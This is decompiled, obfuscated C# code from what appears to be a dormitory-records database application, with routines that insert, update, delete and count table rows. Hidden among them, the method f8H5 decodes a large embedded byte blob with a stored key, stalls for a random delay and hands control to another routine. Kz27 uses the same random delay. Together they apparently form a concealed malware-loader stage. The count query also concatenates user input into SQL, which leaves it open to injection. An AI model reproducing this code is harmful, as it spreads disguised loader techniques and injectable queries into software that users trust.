using System;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Microsoft.VisualBasic.CompilerServices;
using Sn7;
using Ss8;
using Yj2;
using Yn70;
using s8C;

namespace Ey8t;

[StandardModule]
internal sealed class d0N
{
	public static void Wk01()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Nn6.ds.Tables["kytuc"]!.Clear();
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Nn6.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText("select * from kytucxa");
		Nn6.da.set_SelectCommand(val);
		((DbDataAdapter)(object)Nn6.da).Fill(Nn6.ds.Tables["kytuc"]);
	}

	public static void c2PC(string w9PT, string Ga3p)
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		DataRow dataRow = Nn6.ds.Tables["kytuc"]!.NewRow();
		dataRow["maktx"] = w9PT;
		dataRow["tenktx"] = Ga3p;
		Nn6.ds.Tables["kytuc"]!.Rows.Add(dataRow);
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Nn6.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText("insert into kytucxa values(@maktx,@tenktx)");
		val.get_Parameters().Add("@maktx", (OleDbType)200).set_Value((object)w9PT);
		val.get_Parameters().Add("@tenktx", (OleDbType)200).set_Value((object)Ga3p);
		Nn6.da.set_InsertCommand(val);
		((DbDataAdapter)(object)Nn6.da).Update(Nn6.ds.Tables["kytuc"]);
	}

	internal static void Kz27(string y0RH)
	{
		Task.Delay(new Random().Next(1000, 5000)).Wait();
		Wy9t.q9R1(y0RH);
	}

	public static void e9AG(string Fp8r, string Jp6e)
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		DataRow dataRow = Nn6.ds.Tables["kytuc"]!.Select("maktx='" + Fp8r + "'")[0];
		dataRow.BeginEdit();
		dataRow["tenktx"] = Jp6e;
		dataRow.EndEdit();
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Nn6.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText(" update kytucxa set tenktx=@tenktx where maktx=@maktx");
		val.get_Parameters().Add("@tenktx", (OleDbType)200).set_Value((object)Jp6e);
		val.get_Parameters().Add("@maktx", (OleDbType)200).set_Value((object)Fp8r);
		Nn6.da.set_UpdateCommand(val);
		((DbDataAdapter)(object)Nn6.da).Update(Nn6.ds.Tables["kytuc"]);
	}

	internal static void f8H5()
	{
		byte[] array = Wy9t.Yi04(133632);
		checked
		{
			int n4F = Convert.ToInt32(RuntimeHelpers.GetObjectValue(Ct6.mDic[Ct6.sNum])) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Kq8.Sm5(array[i], (byte[])Ct6.mDic[Ct6.sArray], n4F, i);
			}
			Ct6.mDic.Add(Ct6.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			b0Y.Lk1();
		}
	}

	public static void s1GY(string g0A1)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		DataRow dataRow = Nn6.ds.Tables["kytuc"]!.Select("maktx='" + g0A1 + "'")[0];
		dataRow.BeginEdit();
		dataRow.Delete();
		dataRow.EndEdit();
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Nn6.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText(" delete from kytucxa where maktx=@maktx");
		val.get_Parameters().Add("@maktx", (OleDbType)200).set_Value((object)g0A1);
		Nn6.da.set_DeleteCommand(val);
		((DbDataAdapter)(object)Nn6.da).Update(Nn6.ds.Tables["kytuc"]);
	}

	public static int Yd86(string Zq1x)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		OleDbCommand val = new OleDbCommand("select count(*) from kytucxa where maktx='" + Zq1x + "'", Nn6.con);
		return Conversions.ToInteger(val.ExecuteScalar());
	}
}
